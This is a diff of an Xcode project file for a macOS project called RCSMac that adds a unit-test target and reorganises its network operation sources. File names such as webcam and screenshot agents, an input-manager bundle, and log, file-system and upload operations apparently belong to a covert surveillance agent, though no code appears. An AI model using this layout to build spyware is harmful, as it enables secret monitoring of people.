+		1A10795412E720ED0063759B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1AF60BA512EF1EED0091F6F6 /* libz.a in Frameworks */,
+				1AF60BA612EF1EED0091F6F6 /* libspeex.a in Frameworks */,
+				1AF60BA712EF1EED0091F6F6 /* QuartzCore.framework in Frameworks */,
+				1AF60BA812EF1EED0091F6F6 /* QTKit.framework in Frameworks */,
+				1AF60BA912EF1EED0091F6F6 /* CoreAudio.framework in Frameworks */,
+				1AF60BAA12EF1EED0091F6F6 /* QuickTime.framework in Frameworks */,
+				1A107A6412E724080063759B /* IOKit.framework in Frameworks */,
+				1AF60BAB12EF1EED0091F6F6 /* Foundation.framework in Frameworks */,
+				1AF60BAC12EF1EED0091F6F6 /* Carbon.framework in Frameworks */,
+				1AF60BAD12EF1EED0091F6F6 /* ScriptingBridge.framework in Frameworks */,
+				1AF60BAE12EF1EED0091F6F6 /* AddressBook.framework in Frameworks */,
+				1A107A6312E723FE0063759B /* Cocoa.framework in Frameworks */,
+				1A10797312E721850063759B /* GHUnit.framework in Frameworks */,
+				1AF60C4212F028A00091F6F6 /* OCMock.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 		1AF610070FA72D87003F2C12 /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
@@ -268,6 +361,8 @@
 		1058C7A2FEA54F0111CA2CBB /* Other Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				1AF60C4112F028A00091F6F6 /* OCMock.framework */,
+				1A10797212E721850063759B /* GHUnit.framework */,
 				1AA84484113C26D1005FBADB /* libz.a */,
 				1AA84480113C22FE005FBADB /* libspeex.a */,
 				1AD1D6C71099EBAF005B548F /* QuartzCore.framework */,
@@ -288,8 +383,18 @@
 			children = (
 				8D1107320486CEB800E47090 /* RCSMac.app */,
 				1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */,
+				1A10795612E720ED0063759B /* Tests.app */,
 			);
 			name = Products;
+			sourceTree = "<group>";
+		};
+		1A10798712E722440063759B /* Tests */ = {
+			isa = PBXGroup;
+			children = (
+				1A2877D712F039B60008973A /* Core */,
+				1A10798812E722590063759B /* GHUnitTestMain.m */,
+			);
+			name = Tests;
 			sourceTree = "<group>";
 		};
 		1A1B9A840F9E000C0036558C /* Support */ = {
@@ -304,6 +409,46 @@
 				1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */,
 			);
 			name = Support;
+			sourceTree = "<group>";
+		};
+		1A2877D412F0396A0008973A /* Operations */ = {
+			isa = PBXGroup;
+			children = (
+				1A107BD112E730800063759B /* AuthNetworkOperationTest.m */,
+				1AF6074912EDD5A70091F6F6 /* IDNetworkOperationTest.m */,
+				1AF608B512EF0E310091F6F6 /* ConfNetworkOperationTest.m */,
+				1AF60BE312EF27B50091F6F6 /* DownloadNetworkOperationTest.m */,
+				1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */,
+				1A28798512F080B20008973A /* FSNetworkOperationTest.m */,
+				1A7FD31812F17EED00361B0B /* LogNetworkOperationTest.m */,
+				1AF6069E12EDAEA90091F6F6 /* ByeNetworkOperationTest.m */,
+			);
+			name = Operations;
+			sourceTree = "<group>";
+		};
+		1A2877D512F039790008973A /* Transports */ = {
+			isa = PBXGroup;
+			children = (
+				1A107BF512E737060063759B /* RESTTransportTest.m */,
+			);
+			name = Transports;
+			sourceTree = "<group>";
+		};
+		1A2877D612F0398A0008973A /* Protocols */ = {
+			isa = PBXGroup;
+			children = (
+				1A10798D12E722AB0063759B /* RESTNetworkProtocolTest.m */,
+			);
+			name = Protocols;
+			sourceTree = "<group>";
+		};
+		1A2877D712F039B60008973A /* Core */ = {
+			isa = PBXGroup;
+			children = (
+				1AF60C5812F02F600091F6F6 /* Modules */,
+				1AF60BE212EF25EF0091F6F6 /* Categories */,
+			);
+			name = Core;
 			sourceTree = "<group>";
 		};
 		1A40F7DE12DF104700BEACB8 /* Transports */ = {
@@ -322,12 +467,20 @@
 			children = (
 				1A4435210F8CA23E00CD910E /* NSMutableData+AES128.h */,
 				1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */,
+				1AF6072712EDCAC30091F6F6 /* NSMutableData+SHA1.h */,
+				1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */,
 				1A4435470F8CB10800CD910E /* NSString+SHA1.h */,
 				1A4435480F8CB10800CD910E /* NSString+SHA1.m */,
-				1A508A9B11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.h */,
-				1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */,
+				1A7FD33E12F1841200361B0B /* NSData+SHA1.h */,
+				1A7FD33F12F1841200361B0B /* NSData+SHA1.m */,
+				1AF6077912EDE2160091F6F6 /* NSString+Pascal.h */,
+				1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */,
+				1AF60C0212EF2B880091F6F6 /* NSData+Pascal.h */,
+				1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */,
 				1AB5DC3F11CF9DE600B9E32B /* NSApplication+SystemVersion.h */,
 				1AB5DC4011CF9DE600B9E32B /* NSApplication+SystemVersion.m */,
+				1A508A9B11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.h */,
+				1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */,
 			);
 			name = Categories;
 			sourceTree = "<group>";
@@ -388,8 +541,8 @@
 			isa = PBXGroup;
 			children = (
 				1ADC5D8212DDBE7600650A1E /* Operations */,
-				1ADC5D8312DDBE7B00650A1E /* Protocols */,
 				1A40F7DE12DF104700BEACB8 /* Transports */,
+				1ADC5D8312DDBE7B00650A1E /* Protocols */,
 				1A33F3FC0FC696FE00590FA1 /* RCSMCommunicationManager.h */,
 				1A33F3FD0FC696FE00590FA1 /* RCSMCommunicationManager.m */,
 			);
@@ -454,6 +607,33 @@
 			name = Core;
 			sourceTree = "<group>";
 		};
+		1AF60BE112EF25DE0091F6F6 /* Network */ = {
+			isa = PBXGroup;
+			children = (
+				1A2877D412F0396A0008973A /* Operations */,
+				1A2877D512F039790008973A /* Transports */,
+				1A2877D612F0398A0008973A /* Protocols */,
+			);
+			name = Network;
+			sourceTree = "<group>";
+		};
+		1AF60BE212EF25EF0091F6F6 /* Categories */ = {
+			isa = PBXGroup;
+			children = (
+				1AF607A012EED0A40091F6F6 /* NSString+PascalTest.m */,
+				1AF60C0D12EF2CC10091F6F6 /* NSData+PascalTest.m */,
+			);
+			name = Categories;
+			sourceTree = "<group>";
+		};
+		1AF60C5812F02F600091F6F6 /* Modules */ = {
+			isa = PBXGroup;
+			children = (
+				1AF60BE112EF25DE0091F6F6 /* Network */,
+			);
+			name = Modules;
+			sourceTree = "<group>";
+		};
 		1AF610010FA72D50003F2C12 /* InputManager */ = {
 			isa = PBXGroup;
 			children = (
@@ -468,12 +648,15 @@
 		29B97314FDCFA39411CA2CEA /* RCSMac */ = {
 			isa = PBXGroup;
 			children = (
+				1A10798712E722440063759B /* Tests */,
 				1AE6B5620F8E2581004736EA /* Core */,
 				1AF610010FA72D50003F2C12 /* InputManager */,
 				29B97317FDCFA39411CA2CEA /* Resources */,
 				29B97323FDCFA39411CA2CEA /* Frameworks */,
 				19C28FACFE9D520D11CA2CBB /* Products */,
 				1AF6100A0FA72D87003F2C12 /* RCSMInputManager-Info.plist */,
+				1A10793212E718920063759B /* RESTNetworkProtocolTest-Info.plist */,
+				1A10795A12E720ED0063759B /* Tests-Info.plist */,
 			);
 			name = RCSMac;
 			sourceTree = "<group>";
@@ -518,6 +701,23 @@
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
+		1A10795512E720ED0063759B /* Tests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1A10795D12E720EE0063759B /* Build configuration list for PBXNativeTarget "Tests" */;
+			buildPhases = (
+				1A10795212E720ED0063759B /* Resources */,
+				1A10795312E720ED0063759B /* Sources */,
+				1A10795412E720ED0063759B /* Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Tests;
+			productName = Tests;
+			productReference = 1A10795612E720ED0063759B /* Tests.app */;
+			productType = "com.apple.product-type.application";
+		};
 		1AF610080FA72D87003F2C12 /* RCSMInputManager */ = {
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1AF6100D0FA72D8A003F2C12 /* Build configuration list for PBXNativeTarget "RCSMInputManager" */;
@@ -576,11 +776,19 @@
 			targets = (
 				8D1107260486CEB800E47090 /* RCSMac */,
 				1AF610080FA72D87003F2C12 /* RCSMInputManager */,
+				1A10795512E720ED0063759B /* Tests */,
 			);
 		};
 /* End PBXProject section */
 
 /* Begin PBXResourcesBuildPhase section */
+		1A10795212E720ED0063759B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 		1AF610050FA72D87003F2C12 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
@@ -612,6 +820,54 @@
 /* End PBXRezBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
+		1A10795312E720ED0063759B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1AD6C55312E7443D00DEE42D /* NSMutableData+AES128.m in Sources */,
+				1AD6C55412E7443D00DEE42D /* NSString+SHA1.m in Sources */,
+				1AF6091212EF1E5D0091F6F6 /* RCSMTaskManager.m in Sources */,
+				1AF6091812EF1E990091F6F6 /* RCSMLogManager.m in Sources */,
+				1AF6091912EF1E990091F6F6 /* RCSMEvents.m in Sources */,
+				1AF6091A12EF1E990091F6F6 /* RCSMActions.m in Sources */,
+				1AF6091D12EF1ECB0091F6F6 /* RCSMSharedMemory.m in Sources */,
+				1AF6091E12EF1ECB0091F6F6 /* RCSMAgentWebcam.m in Sources */,
+				1AF6091F12EF1ECB0091F6F6 /* RCSMAgentScreenshot.m in Sources */,
+				1AF6092012EF1ECB0091F6F6 /* RCSMCommunicationManager.m in Sources */,
+				1AF6091712EF1E990091F6F6 /* RCSMConfManager.m in Sources */,
+				1AF6092112EF1ECB0091F6F6 /* RCSMEncryption.m in Sources */,
+				1A10796012E721320063759B /* AuthNetworkOperation.m in Sources */,
+				1A10796212E721320063759B /* IDNetworkOperation.m in Sources */,
+				1A10796412E721320063759B /* ConfNetworkOperation.m in Sources */,
+				1A10796612E721320063759B /* DownloadNetworkOperation.m in Sources */,
+				1A10796812E721320063759B /* UploadNetworkOperation.m in Sources */,
+				1A10796A12E721320063759B /* FSNetworkOperation.m in Sources */,
+				1A10796C12E721320063759B /* LogNetworkOperation.m in Sources */,
+				1A10796E12E721320063759B /* ByeNetworkOperation.m in Sources */,
+				1A10796F12E721560063759B /* Transport.m in Sources */,
+				1A10797012E721560063759B /* RESTTransport.m in Sources */,
+				1A10797112E721560063759B /* RESTNetworkProtocol.m in Sources */,
+				1A10797812E721A70063759B /* RCSMCommon.m in Sources */,
+				1A10798912E722590063759B /* GHUnitTestMain.m in Sources */,
+				1A10798E12E722AB0063759B /* RESTNetworkProtocolTest.m in Sources */,
+				1A107BD212E730800063759B /* AuthNetworkOperationTest.m in Sources */,
+				1A107BF612E737060063759B /* RESTTransportTest.m in Sources */,
+				1AF6069F12EDAEA90091F6F6 /* ByeNetworkOperationTest.m in Sources */,
+				1AF6072912EDCAC30091F6F6 /* NSMutableData+SHA1.m in Sources */,
+				1AF6074A12EDD5A70091F6F6 /* IDNetworkOperationTest.m in Sources */,
+				1AF6077B12EDE2160091F6F6 /* NSString+Pascal.m in Sources */,
+				1AF607A112EED0A40091F6F6 /* NSString+PascalTest.m in Sources */,
+				1AF608B612EF0E310091F6F6 /* ConfNetworkOperationTest.m in Sources */,
+				1AF60BE412EF27B50091F6F6 /* DownloadNetworkOperationTest.m in Sources */,
+				1AF60C0412EF2B880091F6F6 /* NSData+Pascal.m in Sources */,
+				1AF60C0E12EF2CC10091F6F6 /* NSData+PascalTest.m in Sources */,
+				1A28786D12F062A80008973A /* UploadNetworkOperationTest.m in Sources */,
+				1A28798612F080B20008973A /* FSNetworkOperationTest.m in Sources */,
+				1A7FD31912F17EED00361B0B /* LogNetworkOperationTest.m in Sources */,
+				1A7FD34012F1841200361B0B /* NSData+SHA1.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 		1AF610060FA72D87003F2C12 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
@@ -650,17 +906,8 @@
 				1A1A2FD010611067001F1B5D /* RCSMAgentWebcam.m in Sources */,
 				1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */,
 				1AB5DC4111CF9DE600B9E32B /* NSApplication+SystemVersion.m in Sources */,
-				1ADC5D9612DDBF2100650A1E /* RESTNetworkProtocol.m in Sources */,
-				1A65115812DDC99100D4F1AF /* IDNetworkOperation.m in Sources */,
-				1A65115B12DDC9B500D4F1AF /* ConfNetworkOperation.m in Sources */,
-				1A65115E12DDC9E200D4F1AF /* DownloadNetworkOperation.m in Sources */,
-				1A65116112DDCA1900D4F1AF /* UploadNetworkOperation.m in Sources */,
-				1A65116412DDCA4600D4F1AF /* FSNetworkOperation.m in Sources */,
-				1A65116712DDCA5700D4F1AF /* LogNetworkOperation.m in Sources */,
-				1A65116A12DDCA6C00D4F1AF /* ByeNetworkOperation.m in Sources */,
-				1A40F7C912DF071C00BEACB8 /* AuthNetworkOperation.m in Sources */,
-				1A40F81812DF293A00BEACB8 /* RESTTransport.m in Sources */,
-				1A5B320D12E4A2AF00677A0B /* Transport.m in Sources */,
+				1AF60C0512EF2B880091F6F6 /* NSData+Pascal.m in Sources */,
+				1A7FD34112F1841200361B0B /* NSData+SHA1.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -686,6 +933,64 @@
 /* End PBXVariantGroup section */
 
 /* Begin XCBuildConfiguration section */
+		1A10795B12E720EE0063759B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_ENABLE_FIX_AND_CONTINUE = YES;
+				GCC_MODEL_TUNING = G5;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				INFOPLIST_FILE = "Tests-Info.plist";
+				INSTALL_PATH = "$(HOME)/Applications";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)\"",
+					"\"$(SRCROOT)/Support/Speex\"",
+				);
+				OTHER_LDFLAGS = (
+					"-framework",
+					Foundation,
+					"-framework",
+					AppKit,
+				);
+				PREBINDING = NO;
+				PRODUCT_NAME = Tests;
+			};
+			name = Debug;
+		};
+		1A10795C12E720EE0063759B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_ENABLE_FIX_AND_CONTINUE = NO;
+				GCC_MODEL_TUNING = G5;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				INFOPLIST_FILE = "Tests-Info.plist";
+				INSTALL_PATH = "$(HOME)/Applications";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)\"",
+					"\"$(SRCROOT)/Support/Speex\"",
+				);
+				OTHER_LDFLAGS = (
+					"-framework",
+					Foundation,
+					"-framework",
+					AppKit,
+				);
+				PREBINDING = NO;
+				PRODUCT_NAME = Tests;
+				ZERO_LINK = NO;
+			};
+			name = Release;
+		};
 		1AF6100B0FA72D8A003F2C12 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
@@ -859,6 +1164,15 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
+		1A10795D12E720EE0063759B /* Build configuration list for PBXNativeTarget "Tests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1A10795B12E720EE0063759B /* Debug */,
+				1A10795C12E720EE0063759B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
 		1AF6100D0FA72D8A003F2C12 /* Build configuration list for PBXNativeTarget "RCSMInputManager" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
